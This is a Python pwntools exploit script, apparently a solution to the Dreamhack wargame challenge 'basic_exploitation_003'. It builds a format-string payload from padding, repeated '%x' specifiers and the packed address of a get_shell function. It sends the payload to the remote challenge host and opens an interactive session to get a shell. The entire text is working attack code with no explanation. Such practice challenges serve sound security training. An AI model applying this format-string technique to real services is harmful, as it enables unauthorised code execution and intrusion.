from pwn import *


e = ELF('./basic_exploitation_003')
get_shell = e.symbols['get_shell']

r = remote('host1.dreamhack.games', 8377)
payload = ''
payload += 'aaaa'
payload += '%x'*19
payload += p32(get_shell)

r.sendline(payload)


r.interactive()
